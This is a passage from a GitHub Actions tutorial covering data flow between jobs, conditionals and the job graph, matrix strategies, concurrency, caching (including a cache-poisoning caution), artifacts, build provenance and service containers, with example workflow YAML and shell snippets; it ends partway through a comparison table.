🧠 Use `vars` for anything that is configuration but not sensitive. It keeps workflow files generic and lets you change config without a code review.

### 10.6 Passing data between jobs: the three mechanisms

**1. Job outputs — for small strings**

```yaml
jobs:
  build:
    runs-on: ubuntu-24.04
    outputs:
      image: ${{ steps.push.outputs.image }}
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - id: push
        run: |
          echo "image=ghcr.io/org/api:${GITHUB_SHA}" >> "$GITHUB_OUTPUT"
          echo "digest=sha256:abc123" >> "$GITHUB_OUTPUT"

  deploy:
    needs: build
    runs-on: ubuntu-24.04
    steps:
      - run: kubectl set image deploy/api api=${{ needs.build.outputs.image }}@${{ needs.build.outputs.digest }}
```

Limits: strings only, ~1 MB total per job, **not masked** (never secrets), and ⚠️ **a matrix job's outputs are overwritten by each matrix leg** — the last one to finish wins, non-deterministically. To collect per-leg results, use artifacts.

**2. Artifacts — for files**

```yaml
  build:
    steps:
      - uses: actions/upload-artifact@v7
        with:
          name: app-jar
          path: target/*.jar
          retention-days: 7

  deploy:
    needs: build
    steps:
      - uses: actions/download-artifact@v8
        with:
          name: app-jar
          path: ./dist
```

**3. A registry or external store — the production answer for build outputs**

For container images, packages and anything you will deploy, the artifact store is the *wrong* place. Push to GHCR / ECR / Artifact Registry / Nexus and pass the **immutable digest** as a job output. That way the same bytes flow to every environment and you get retention, scanning, and signature verification for free.

### 10.7 Data-flow decision table

| I need to pass... | Between | Use |
|---|---|---|
| A version string | steps | `$GITHUB_OUTPUT` |
| An env var | steps | `$GITHUB_ENV` |
| A binary/JAR | jobs, same run | artifact |
| An image | jobs or runs | registry + digest as output |
| A short string | jobs | job output |
| Per-matrix-leg results | matrix legs → aggregator job | artifacts with unique names, then `pattern:` + `merge-multiple` |
| Dependencies | runs | cache |
| A report to a human | anywhere | `$GITHUB_STEP_SUMMARY` |
| A file to a *different workflow run* | runs | artifact + `run-id` via API, or an external bucket |

---

## Chapter 11 — Conditionals, `needs`, and the Job Graph

### 11.1 `needs` builds the DAG

```yaml
jobs:
  lint:        { runs-on: ubuntu-24.04, steps: [...] }
  unit:        { runs-on: ubuntu-24.04, steps: [...] }
  integration: { needs: [unit], runs-on: ubuntu-24.04, steps: [...] }
  build:       { needs: [lint, unit], runs-on: ubuntu-24.04, steps: [...] }
  scan:        { needs: [build], runs-on: ubuntu-24.04, steps: [...] }
  deploy:      { needs: [integration, scan], runs-on: ubuntu-24.04, steps: [...] }
```

```mermaid
flowchart LR
    lint --> build
    unit --> build
    unit --> integration
    build --> scan
    integration --> deploy
    scan --> deploy
```

`lint` and `unit` start simultaneously. `integration` and `build` start as soon as their dependencies finish. Nothing waits unnecessarily.

🧠 **Design principle: put the fastest, most-likely-to-fail checks first and unblocked.** A 15-second lint job that runs in parallel with a 4-minute test job gives developers a failure signal in 15 seconds.

### 11.2 The default `if` is `success()`

Every job and step has an implicit `if: success()`. The moment you write your own `if:`, that implicit condition **disappears**.

```yaml
# ⚠️ This job runs even if `build` FAILED
notify:
  needs: [build]
  if: github.event_name == 'push'

# ✅ Restore the success requirement explicitly
notify:
  needs: [build]
  if: success() && github.event_name == 'push'

# ✅ Or, for a notifier that should report both outcomes
notify:
  needs: [build]
  if: always()
```

This is the #1 cause of "why did my deploy job run when tests failed?".

### 11.3 Reading upstream results

```yaml
report:
  needs: [lint, unit, integration, scan]
  if: always()
  runs-on: ubuntu-24.04
  steps:
    - run: |
        echo "lint:        ${{ needs.lint.result }}"
        echo "unit:        ${{ needs.unit.result }}"
        echo "integration: ${{ needs.integration.result }}"
        echo "scan:        ${{ needs.scan.result }}"
```

`needs.<job>.result` is one of `success`, `failure`, `cancelled`, `skipped`.

### 11.4 The "skipped jobs make the run green" trap

If a required job is skipped, the workflow run is reported as **successful**. On a branch protection rule with required checks, this silently lets broken changes through.

The fix is an explicit gate job:

```yaml
  ci-gate:
    name: CI Gate                    # make THIS the required status check
    if: always()
    needs: [lint, unit, integration, scan]
    runs-on: ubuntu-24.04
    steps:
      - name: Fail if any dependency did not succeed
        if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')
        run: |
          echo "One or more required checks failed." >&2
          exit 1
      - run: echo "All checks passed."
```

🧠 This single job is one of the highest-value patterns in this guide. Make `CI Gate` the only required status check, and you can add, remove and rename underlying jobs without ever touching branch protection.

If you also want to treat `skipped` as failure (stricter, and correct when skipping is never legitimate):

```yaml
- if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled') || contains(needs.*.result, 'skipped')
  run: exit 1
```

But be careful — with path filters, legitimate skips are common. Prefer to make skipped jobs *succeed trivially* rather than skip (§46.4).

### 11.5 `needs` with conditional upstream jobs

```yaml
jobs:
  detect:
    outputs:
      backend: ${{ steps.f.outputs.backend }}
    # ...
  backend-test:
    needs: detect
    if: needs.detect.outputs.backend == 'true'
    # ...
  deploy:
    needs: [detect, backend-test]
    # ⚠️ if backend-test is skipped, deploy is skipped too
    if: always() && needs.backend-test.result != 'failure'
```

---

## Chapter 12 — Matrix Strategies

### 12.1 Basic matrix

```yaml
jobs:
  test:
    strategy:
      matrix:
        java: ['17', '21', '25']
        os: [ubuntu-24.04, windows-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-java@v6
        with:
          distribution: temurin
          java-version: ${{ matrix.java }}
      - run: mvn -B verify
```

This produces **6 jobs**, all in parallel, each on its own runner.

Maximum **256 jobs** per matrix expansion.

### 12.2 `include` — add or augment combinations

```yaml
strategy:
  matrix:
    java: ['17', '21']
    os: [ubuntu-24.04]
    include:
      # adds a property to EXISTING matching combinations
      - java: '21'
        coverage: true
      # adds an entirely NEW combination
      - java: '25-ea'
        os: ubuntu-24.04
        experimental: true
```

The rule: an `include` entry whose keys **all match** an existing combination's values *augments* it. Otherwise it *appends* a new combination.

Then use it:

```yaml
- if: matrix.coverage
  run: mvn -B verify -Pcoverage
```

### 12.3 `exclude` — remove combinations

```yaml
strategy:
  matrix:
    java: ['17', '21']
    os: [ubuntu-24.04, windows-latest, macos-latest]
    exclude:
      - java: '17'
        os: macos-latest          # skip this one
```

`exclude` is applied **before** `include`.

### 12.4 `fail-fast` and `max-parallel`

```yaml
strategy:
  fail-fast: false        # default true — one failure cancels all siblings
  max-parallel: 4         # cap concurrent legs
  matrix: { ... }
```

🧠 **Set `fail-fast: false` for test matrices.** You want to know whether the failure is Java-17-only or universal. Keep `fail-fast: true` (the default) for expensive matrices where one failure means the whole thing is doomed anyway.

💰 `max-parallel` is a cost/concurrency throttle. Useful when a matrix would otherwise consume your whole concurrency allowance, or when legs contend on a shared resource (a test database, an API rate limit).

### 12.5 Dynamic matrices — the pattern that unlocks monorepos

Generate the matrix as JSON from a previous job.

```yaml
jobs:
  discover:
    runs-on: ubuntu-24.04
    outputs:
      services: ${{ steps.find.outputs.services }}
      has_any: ${{ steps.find.outputs.has_any }}
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }

      - id: find
        run: |
          set -euo pipefail
          BASE="${{ github.event.pull_request.base.sha || github.event.before }}"
          CHANGED="$(git diff --name-only "$BASE" "${GITHUB_SHA}" || true)"

          SERVICES="$(
            echo "$CHANGED" \
              | grep '^services/' \
              | cut -d/ -f2 \
              | sort -u \
              | jq -R -s -c 'split("\n") | map(select(length > 0))'
          )"
          SERVICES="${SERVICES:-[]}"

          echo "services=$SERVICES" >> "$GITHUB_OUTPUT"
          if [ "$SERVICES" = "[]" ]; then
            echo "has_any=false" >> "$GITHUB_OUTPUT"
          else
            echo "has_any=true" >> "$GITHUB_OUTPUT"
          fi

  build:
    needs: discover
    if: needs.discover.outputs.has_any == 'true'
    strategy:
      fail-fast: false
      matrix:
        service: ${{ fromJSON(needs.discover.outputs.services) }}
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - run: ./gradlew ":services:${{ matrix.service }}:build"
```

⚠️ **An empty matrix array causes an error**, not a skip. That is why `has_any` exists.

🧠 A matrix can carry whole objects, not just scalars:

```yaml
matrix:
  include: ${{ fromJSON(needs.discover.outputs.config) }}
```

where `config` is `[{"service":"api","runner":"ubuntu-24.04-arm","dockerfile":"api/Dockerfile"},...]`. This is how you drive fully data-driven pipelines from a `services.yaml` manifest in the repo.

### 12.6 `strategy` context — sharding

```yaml
strategy:
  fail-fast: false
  matrix:
    shard: [1, 2, 3, 4]
steps:
  - run: npx playwright test --shard=${{ matrix.shard }}/${{ strategy.job-total }}
```

`strategy.job-index` (0-based) and `strategy.job-total` let a leg know where it sits. Sharding a 20-minute test suite into 4 legs gives you a 5-minute gate for 4× the minutes — usually a good trade on a PR gate.

### 12.7 Naming matrix jobs

By default a matrix job shows as `test (ubuntu-24.04, 21)`. Set `name:` for readability, which also matters because **required status checks match on the rendered job name**:

```yaml
jobs:
  test:
    name: Test · Java ${{ matrix.java }} · ${{ matrix.os }}
```

⚠️ If you use a matrix job as a required check, every leg name must be stable. Adding a Java version changes the set of check names and breaks branch protection. This is another reason to use the single `CI Gate` job from §11.4.

---

## Chapter 13 — Concurrency, Cancellation, Timeouts and Retries

### 13.1 The problem concurrency solves

Without it:
- A developer pushes 5 commits in 2 minutes → 5 full CI runs, 4 of them pointless. 💰
- Two merges to `main` land seconds apart → two deploys race, and the older one may finish last, deploying stale code.

### 13.2 Syntax

```yaml
concurrency:
  group: <a string; runs sharing a group serialise>
  cancel-in-progress: <true | false | expression>
```

Can be set at **workflow level** or **job level**.

### 13.3 The two canonical patterns

**Pattern A — PR checks: cancel superseded runs**

```yaml
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

New push to the same branch kills the in-flight run. Saves money, gives faster feedback on the latest code.

**Pattern B — Deployments: queue, never cancel**

```yaml
concurrency:
  group: deploy-production
  cancel-in-progress: false
```

⚠️ **Never `cancel-in-progress: true` on a deployment.** Cancelling a `kubectl apply` or a Terraform apply mid-flight leaves your infrastructure in an undefined state. Queue them instead.

**The combined idiom** — cancel on PRs, queue on main:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

```mermaid
flowchart TD
    subgraph A["cancel-in-progress: true (PR checks)"]
        A1["Run 1 starts"] --> A2["Push arrives"]
        A2 --> A3["Run 1 CANCELLED"]
        A2 --> A4["Run 2 starts"]
    end
    subgraph B["cancel-in-progress: false (deploys)"]
        B1["Deploy 1 running"] --> B2["Deploy 2 requested"]
        B2 --> B3["Deploy 2 PENDING in queue"]
        B1 --> B4["Deploy 1 completes"]
        B4 --> B5["Deploy 2 starts"]
    end
```

⚠️ **Queue depth is 1.** If deploy 1 is running and deploys 2 and 3 arrive, deploy 2 is *cancelled* when 3 arrives. Only the newest pending run survives. This is usually what you want for deploys (deploy the latest) but is surprising the first time.

### 13.4 Concurrency group design

The group string is what defines "these runs conflict". Choose deliberately.

| Goal | Group |
|---|---|
| Per-branch CI | `${{ github.workflow }}-${{ github.ref }}` |
| Per-PR (survives force-push) | `${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}` |
| Per-environment deploys | `deploy-${{ inputs.environment }}` |
| Per-service-per-environment | `deploy-${{ matrix.service }}-${{ inputs.environment }}` |
| Global singleton (e.g. a migration) | `db-migration` |
| Terraform state lock | `tf-${{ inputs.workspace }}` |

### 13.5 Job-level concurrency

Lets one workflow have different concurrency for different jobs:

```yaml
jobs:
  test:
    # no concurrency — fully parallel
  deploy-staging:
    concurrency:
      group: deploy-staging
      cancel-in-progress: false
  deploy-prod:
    concurrency:
      group: deploy-prod
      cancel-in-progress: false
```

### 13.6 Timeouts

```yaml
jobs:
  build:
    timeout-minutes: 20             # job level — set this always
    steps:
      - name: Flaky external call
        timeout-minutes: 5          # step level
        run: ./call-vendor-api.sh
```

Defaults: 360 minutes per job; 35 days for a whole workflow run (including queue time).

### 13.7 Retries

There is **no native step retry**. Three options:

**1. In-script retry (best for network flakiness)**

```yaml
- name: Publish with retry
  run: |
    set -euo pipefail
    for attempt in 1 2 3 4 5; do
      if mvn -B deploy -DskipTests; then
        exit 0
      fi
      echo "Attempt $attempt failed; retrying in $((attempt * 10))s"
      sleep $((attempt * 10))
    done
    echo "All attempts failed" >&2
    exit 1
```

**2. A retry action**

```yaml
- uses: nick-fields/retry@v3
  with:
    timeout_minutes: 10
    max_attempts: 3
    retry_wait_seconds: 30
    command: ./scripts/deploy.sh
```

**3. Re-run the job from the UI/API.** Note 📌 **workflow runs are limited to 50 reruns** (introduced April 2026), which is a sensible guard against infinite retry loops.

⚠️ **Retries hide problems.** A retry is correct for a genuinely transient failure (network, registry 503, runner disk hiccup). A retry around a flaky *test* is technical debt with interest. Instrument flakiness (§50.4) rather than papering over it.

### 13.8 Idempotency: the property retries require

Any step that might be retried must be safe to run twice.

| Operation | Idempotent? | How to make it so |
|---|---|---|
| `docker push` same tag | Yes | Content-addressed |
| `kubectl apply` | Yes | Declarative |
| `terraform apply` | Yes | State-based |
| DB migration with Flyway/Liquibase | Yes | Version table |
| `aws s3 cp` | Yes | Overwrites |
| `git tag v1.0.0 && git push --tags` | **No** | Check existence first, or use `--force` deliberately |
| Publishing to Maven Central | **No** | Releases are immutable; guard with a "already published?" check |
| Sending a Slack notification | **No** | Acceptable to duplicate, or deduplicate by `run_id` |
| Incrementing a counter | **No** | Use the run number as the value instead |

---
## Chapter 14 — Caching

Caching is the single biggest lever on pipeline speed. It is also the one most people get subtly wrong.

### 14.1 Cache vs artifact — know the difference

| | Cache | Artifact |
|---|---|---|
| Purpose | Speed up *re-creating* something derivable | *Preserve* something you need later |
| If missing | Job still works, just slower | Job fails |
| Lifetime | Evicted after 7 days unused, or when the repo cache exceeds its limit | Retained for a fixed period (default 90 days) |
| Scoped to | Branch, with fallback to base/default branch | Workflow run |
| Content | Dependencies, compiled intermediates, toolchains | Build outputs, reports, logs, binaries |
| Guarantee | **Best effort. Never rely on it** | Durable within retention |

🧠 The test: *if this disappeared, would my job be slower, or would it be broken?* Slower → cache. Broken → artifact.

### 14.2 `actions/cache`

```yaml
- uses: actions/cache@v6
  id: maven-cache
  with:
    path: ~/.m2/repository
    key: ${{ runner.os }}-maven-${{ hashFiles('**/pom.xml') }}
    restore-keys: |
      ${{ runner.os }}-maven-
```

Mechanics:
1. **Restore phase** (when the step runs): try an exact match on `key`. If none, try each `restore-keys` entry as a **prefix**, newest first. A prefix hit is a *partial* restore — you get a cache, but `cache-hit` is `false`.
2. **Save phase** (automatically in the job's post-steps, only if the job succeeded): if there was no exact `key` match, save the `path` under `key`.

⚠️ **Cache entries are immutable.** You cannot overwrite an existing key. If your key never changes (`key: maven-cache`), you save once and never update it again — a cache that slowly becomes useless.

### 14.3 Designing cache keys

The key must change exactly when the cached content should change.

```yaml
key: ${{ runner.os }}-${{ runner.arch }}-maven-${{ hashFiles('**/pom.xml') }}
```

Components, in order:
1. **OS and arch** — a Linux x64 `~/.m2` is not valid on Windows or ARM.
2. **A name** — so different caches in the same repo do not collide.
3. **A hash of the dependency manifest** — the actual cache-invalidation signal.

`hashFiles()` takes glob patterns relative to `GITHUB_WORKSPACE` and returns a SHA-256 over the matched file contents. Use the **lockfile** where one exists, because it pins transitive versions:

| Ecosystem | `path` | `hashFiles` target |
|---|---|---|
| Maven | `~/.m2/repository` | `**/pom.xml` |
| Gradle | `~/.gradle/caches`, `~/.gradle/wrapper` | `**/*.gradle*`, `**/gradle-wrapper.properties`, `**/gradle/libs.versions.toml` |
| Go modules | `~/go/pkg/mod` | `**/go.sum` |
| Go build cache | `~/.cache/go-build` | `**/go.sum` + source hash |
| npm | `~/.npm` | `**/package-lock.json` |
| pnpm | `~/.local/share/pnpm/store` | `**/pnpm-lock.yaml` |
| pip | `~/.cache/pip` | `**/requirements*.txt`, `**/poetry.lock` |
| Cargo | `~/.cargo/registry`, `~/.cargo/git`, `target/` | `**/Cargo.lock` |

### 14.4 `restore-keys` — the graceful degradation ladder

```yaml
key: ${{ runner.os }}-maven-${{ hashFiles('**/pom.xml') }}
restore-keys: |
  ${{ runner.os }}-maven-
  ${{ runner.os }}-
```

Adding one dependency changes the hash and misses the exact key — but `Linux-maven-` matches the previous cache, so you restore 99% of your dependencies and only download the new one. Without `restore-keys`, every dependency change costs you a full cold download.

🧠 Order `restore-keys` from most specific to least specific.

### 14.5 `cache-hit` and conditional steps

```yaml
- uses: actions/cache@v6
  id: cache
  with:
    path: ./node_modules
    key: node-${{ hashFiles('package-lock.json') }}

- if: steps.cache.outputs.cache-hit != 'true'
  run: npm ci
```

⚠️ `cache-hit` is `'true'` only for an **exact** key match. With `restore-keys` it will usually be `'false'` even though you got a useful partial restore. For dependency caches, prefer running the install command unconditionally — it will be fast when the cache is warm, and correct when it is stale.

### 14.6 Restore-only and save-only

Sometimes you want to split the phases across jobs:

```yaml
# In a warm-up job: save only
- uses: actions/cache/save@v6
  with:
    path: ~/.m2/repository
    key: maven-${{ hashFiles('**/pom.xml') }}

# In consumer jobs: restore only
- uses: actions/cache/restore@v6
  with:
    path: ~/.m2/repository
    key: maven-${{ hashFiles('**/pom.xml') }}
    restore-keys: maven-
```

Very useful for a matrix: one job populates the cache, N matrix legs only read it, avoiding N concurrent writes of the same content.

### 14.7 Cache scoping — the rule that confuses everyone

```mermaid
flowchart TD
    M["Cache written on main<br/>(default branch)"] --> F1["feature/a can READ it"]
    M --> F2["feature/b can READ it"]
    F1 -.->|"CANNOT read"| F2
    F2 -.->|"CANNOT read"| F1
    F1 --> PR1["PR from feature/a<br/>reads feature/a + main caches"]
```

Rules:
- A workflow run can restore caches created **on its own branch**, and caches created on the **base branch** or the **default branch**.
- Sibling branches cannot see each other's caches.
- A PR's run can read the base branch's cache, and writes to its *own* scope.

**Practical consequence:** warm the cache on `main`. If your cache is only ever written by PR runs, every new branch starts cold. A nightly or post-merge job that populates the cache on `main` is one of the cheapest speedups available.

⚠️ **Fork PRs cannot write to the cache at all**, and read access is restricted. Do not depend on cache for correctness in fork CI.

### 14.8 `cache-mode` — least-privilege cache access

📌 **New and important (GA September 2026).** You can now declare cache access at workflow or job level:

```yaml
name: PR Check
on: pull_request

cache-mode: read          # this whole workflow can restore but not write

jobs:
  pr-check:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with: { node-version: '22', cache: npm }
      - run: npm ci
      - run: npm test

  untrusted:
    runs-on: ubuntu-24.04
    cache-mode: none        # this job runs untrusted input: no cache access at all
    steps:
      - uses: actions/checkout@v7
      - run: ./scripts/run-untrusted.sh
```

Values are `read`, `write`, `none`. Job-level overrides workflow-level. The mode is enforced by the cache service itself, and it **carries through reusable workflows — a called workflow cannot receive more cache access than its caller granted**. An explicit `cache-mode` also overrides the read-only cache default applied to low-trust events such as `pull_request_target`.

🧠 **Why this matters: cache poisoning.** The cache is a shared, writable, mostly-unverified store. If an attacker can get a malicious binary into a cache key that a trusted `main` build later restores, they have achieved code execution in a privileged context. `cache-mode: read` on PR workflows closes this off. Adopt it.

### 14.9 Built-in caching in `setup-*` actions

```yaml
- uses: actions/setup-java@v6
  with:
    distribution: temurin
    java-version: '21'
    cache: maven            # or gradle, sbt

- uses: actions/setup-node@v7
  with:
    node-version: '22'
    cache: npm              # or yarn, pnpm
    cache-dependency-path: ./frontend/package-lock.json

- uses: actions/setup-go@v7
  with:
    go-version: '1.24'
    cache: true             # default true; caches module and build cache
    cache-dependency-path: '**/go.sum'

- uses: actions/setup-python@v7
  with:
    python-version: '3.12'
    cache: pip
```

For the common case this is all you need, and it handles key construction for you. Drop to `actions/cache` when you need a non-standard path or custom invalidation.

⚠️ `setup-node@v7` narrowed automatic caching to npm only in some versions; declare `cache:` explicitly rather than relying on defaults.

For Gradle specifically, `gradle/actions/setup-gradle@v6` is better than generic caching — it caches the configuration cache and build cache intelligently and writes a build summary.

### 14.10 Docker layer caching

Layer caching for image builds is its own problem because the Docker daemon's cache does not survive the ephemeral runner.

**Option 1 — GitHub Actions cache backend (good default)**

```yaml
- uses: docker/setup-buildx-action@v4
- uses: docker/build-push-action@v7
  with:
    context: .
    push: true
    tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

`mode=max` caches intermediate layers too (bigger, but far better hit rate for multi-stage builds).

**Option 2 — Registry cache (best for cross-branch sharing)**

```yaml
    cache-from: type=registry,ref=ghcr.io/${{ github.repository }}:buildcache
    cache-to: type=registry,ref=ghcr.io/${{ github.repository }}:buildcache,mode=max
```

Not subject to Actions cache branch scoping or the 10 GB limit — every branch shares one cache. Costs registry storage.

**Option 3 — Remote builders.** Third-party runner vendors provide persistent BuildKit daemons; effectively a warm Docker cache. Biggest win for heavy image builds.

🧠 The largest Dockerfile speedup is usually not caching at all — it is **ordering your layers so dependency installation comes before source copy**:

```dockerfile
# Dependencies change rarely — cached
COPY pom.xml .
RUN mvn -B -ntp dependency:go-offline

# Source changes every commit — only this layer rebuilds
COPY src ./src
RUN mvn -B -ntp package -DskipTests
```

### 14.11 Limits and eviction

| Limit | Value |
|---|---|
| Total cache size per repository | **10 GB** |
| Eviction policy | Least-recently-used once over the limit |
| Unused entry expiry | 7 days |
| Max single entry | Effectively bounded by the 10 GB repo limit |

💰 Exceeding 10 GB does not error — it silently evicts your oldest caches, including ones you care about. Symptom: "caching worked last month, now it always misses". Audit with:

```bash
gh cache list --limit 100 --sort size_in_bytes --order desc
gh cache delete <key>
```

Or in a scheduled cleanup workflow (§36.5).

### 14.12 What not to cache

- **Build outputs you need later** — those are artifacts.
- **Secrets, credentials, `~/.docker/config.json`** — the cache is shared across branches.
- **Anything larger than the time it takes to download** — a 3 GB cache that takes 90 s to restore is worse than a 60 s `npm ci`. **Measure.**
- **The whole `target/` or `build/` directory across unrelated branches** — stale incremental state causes bizarre, unreproducible failures.

---

## Chapter 15 — Artifacts

### 15.1 Upload and download

```yaml
- uses: actions/upload-artifact@v7
  with:
    name: app-jar
    path: |
      target/*.jar
      target/classes/META-INF/build-info.properties
    retention-days: 7
    if-no-files-found: error      # error | warn | ignore  — default is warn
    compression-level: 6          # 0-9; use 0 for already-compressed content
    overwrite: false
    include-hidden-files: false
```

```yaml
- uses: actions/download-artifact@v8
  with:
    name: app-jar
    path: ./dist
```

### 15.2 What changed in v4+ (and why old examples break)

The artifact actions were rewritten, and the semantics are genuinely different from v3:

| | v3 and earlier | v4 and later |
|---|---|---|
| Upload speed | Slow | Up to ~10× faster |
| Immutability | Multiple uploads merged into one artifact | **Each artifact is immutable once uploaded** |
| Same name twice | Appended | **Fails** (unless `overwrite: true`) |
| Availability | After the whole run | **Immediately after upload** |
| Download all | `name:` omitted downloaded everything into subdirs | Use `pattern:` and `merge-multiple:` |
| Digest verification | none | hash checks; `download-artifact@v8` **errors on hash mismatch by default** (previously a warning) |

⚠️ **The matrix collision.** This fails on the second leg in v4+:

```yaml
strategy:
  matrix:
    os: [ubuntu-24.04, windows-latest]
steps:
  - uses: actions/upload-artifact@v7
    with:
      name: build          # ❌ same name for both legs
```

Fix by making names unique, then merging on download:

```yaml
  - uses: actions/upload-artifact@v7
    with:
      name: build-${{ matrix.os }}-${{ matrix.java }}
      path: target/*.jar
```

```yaml
  collect:
    needs: build
    steps:
      - uses: actions/download-artifact@v8
        with:
          pattern: build-*
          path: ./all-builds
          merge-multiple: false     # keep per-leg subdirectories
```

`merge-multiple: true` flattens everything into one directory (fine when filenames differ, destructive when they collide).

### 15.3 Cross-workflow artifact download

Artifacts are scoped to a run. To fetch one from a *different* run:

```yaml
- uses: actions/download-artifact@v8
  with:
    name: build-output
    run-id: ${{ github.event.workflow_run.id }}
    github-token: ${{ secrets.GITHUB_TOKEN }}
    repository: ${{ github.repository }}
```

Requires `actions: read` permission.

### 15.4 Retention and cost

| Repo type | Default retention | Max |
|---|---|---|
| Public | 90 days | 90 days |
| Private | 90 days (configurable org-wide) | 400 days |

💰 Artifact storage is **billed** for private repositories, and the bill is per GB-month. Common waste: uploading `node_modules`, uploading full Docker images as tarballs, uploading verbose logs with 90-day retention.

Practical policy:

| Artifact | Retention |
|---|---|
| Test reports, coverage for a PR | 3–7 days |
| Build artifacts for a PR | 1–3 days |
| Release binaries | Attach to a GitHub Release instead (unlimited, free) |
| Container images | Registry, not artifacts |
| Debug/diagnostic dumps | 7 days |
| SBOMs, attestations for compliance | Registry or dedicated store |

Set a sensible org-wide default in Settings → Actions, and override per upload.

### 15.5 What to upload — a practical list

```yaml
- name: Upload test reports
  if: always()                            # crucial: you want these when the build FAILED
  uses: actions/upload-artifact@v7
  with:
    name: test-reports-${{ matrix.java }}
    path: |
      **/target/surefire-reports/**
      **/target/failsafe-reports/**
      **/build/reports/tests/**
    retention-days: 7
    if-no-files-found: ignore
```

Others worth capturing on failure: heap dumps, container logs (`docker compose logs`), Playwright traces and videos, Terraform plan files, `npm-debug.log`, the resolved dependency tree.

### 15.6 Build provenance attestations

Beyond storing the artifact, you can prove *how* it was built.

```yaml
permissions:
  id-token: write
  attestations: write
  contents: read

steps:
  - uses: actions/attest-build-provenance@v4
    with:
      subject-path: 'target/*.jar'
```

For container images:

```yaml
  - uses: actions/attest-build-provenance@v4
    with:
      subject-name: ghcr.io/${{ github.repository }}
      subject-digest: ${{ steps.push.outputs.digest }}
      push-to-registry: true
```

This produces a signed, SLSA-compatible provenance statement recorded in a transparency log, tying the artifact digest to the workflow, repo, commit and runner. Consumers verify with:

```bash
gh attestation verify ./app.jar --repo my-org/my-service
# or, for images
gh attestation verify oci://ghcr.io/my-org/api:1.4.2 --repo my-org/my-service
```

🧠 This is the practical, low-effort answer to "prove this binary came from this source commit". Enable it for anything you ship. See §31.8.

---

## Chapter 16 — Container Jobs and Service Containers

### 16.1 Container jobs — run all steps inside an image

```yaml
jobs:
  build:
    runs-on: ubuntu-24.04
    container:
      image: maven:3.9-eclipse-temurin-21
      env:
        MAVEN_OPTS: -Xmx2g
      ports: ['8080']
      volumes:
        - /tmp/shared:/shared
      options: --cpus 2 --user root
      credentials:                        # for private images
        username: ${{ github.actor }}
        password: ${{ secrets.GITHUB_TOKEN }}
    steps:
      - uses: actions/checkout@v7
      - run: mvn -B verify                # runs inside the container
```

The runner starts the container, mounts the workspace into it, and executes every step inside.

**Use when:** you need an exact toolchain that is painful to install, you want the same environment locally (`docker run` the same image) and in CI, or your build already has a builder image.

**Don't use when:** the preinstalled runner tooling is sufficient. A container job adds image pull time, and some actions behave differently inside containers.

⚠️ Gotchas with container jobs:
- **You are root by default**, so files created in the workspace may be root-owned and confuse later steps.
- **`actions/cache` needs `tar` and `zstd` in the image.** Minimal images (Alpine, distroless) will fail. Install them, or use a fuller base.
- **The tool cache is not available**, so `setup-java` etc. will download rather than use the preinstalled JDK.
- **Only Linux containers** are supported on Linux runners.
- **JavaScript actions need a compatible Node** inside the container in some configurations.

### 16.2 Service containers — sidecars for integration tests

```yaml
jobs:
  integration:
    runs-on: ubuntu-24.04
    services:
      postgres:
        image: postgres:17
        env:
          POSTGRES_USER: app
          POSTGRES_PASSWORD: app
          POSTGRES_DB: appdb
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U app"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 10

      redis:
        image: redis:7-alpine
        ports: ['6379:6379']
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-retries 10

      kafka:
        image: bitnami/kafka:3.7
        env:
          KAFKA_CFG_NODE_ID: '0'
          KAFKA_CFG_PROCESS_ROLES: controller,broker
          KAFKA_CFG_LISTENERS: PLAINTEXT://:9092,CONTROLLER://:9093
          KAFKA_CFG_CONTROLLER_QUORUM_VOTERS: 0@localhost:9093
        ports: ['9092:9092']

    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '21', cache: maven }
      - run: mvn -B verify -Pintegration-tests
        env:
          SPRING_DATASOURCE_URL: jdbc:postgresql://localhost:5432/appdb
          SPRING_DATASOURCE_USERNAME: app
          SPRING_DATASOURCE_PASSWORD: app
          SPRING_DATA_REDIS_HOST: localhost
```

📌 **New in 2026:** service containers now support `entrypoint` and `command` keys to override the image defaults, matching Docker Compose naming:

```yaml
      custom:
        image: my-org/tool:1.0
        entrypoint: /bin/sh
        command: ['-c', 'exec my-server --port 8080']
```

This removes a long-standing class of workaround where you had to bake a wrapper image just to change the entrypoint.

### 16.3 Networking: the rule that trips people up

```mermaid
flowchart TD
    subgraph HOST["Job runs directly on the runner"]
        H1["Step process"] -->|"localhost:5432"| H2["postgres service<br/>via mapped port"]
    end
    subgraph CONT["Job runs in a container"]
        C1["Step process in container"] -->|"postgres:5432<br/>(service NAME as hostname)"| C2["postgres service<br/>same user-defined network"]
    end
```

| Job type | Hostname to use | Port |
|---|---|---|
| Job on the runner (no `container:`) | `localhost` | The **mapped host** port from `ports:` |
| Job inside a `container:` | The **service key name** (`postgres`) | The **container** port; `ports:` mapping is unnecessary |

Getting a dynamically-assigned port:

```yaml
    services:
      postgres:
        image: postgres:17
        ports: ['5432/tcp']         # random host port
    steps:
      - run: psql -h localhost -p ${{ job.services.postgres.ports['5432'] }} ...
```

### 16.4 Health checks are not optional

⚠️ Without `--health-cmd`, the runner starts the container and immediately runs your steps. Postgres takes several seconds to accept connections. Your tests will fail intermittently, and you will blame the tests.

Always add health check options, and where the image has no good health command, add an explicit wait step:

```yaml
- name: Wait for Kafka
  run: |
    for i in $(seq 1 30); do
      if nc -z localhost 9092; then echo "ready"; exit 0; fi
      sleep 2
    done
    echo "Kafka never became ready" >&2
    exit 1
```

### 16.5 Service containers vs Testcontainers vs docker compose

| Approach | Pros | Cons | Use when |
|---|---|---|---|
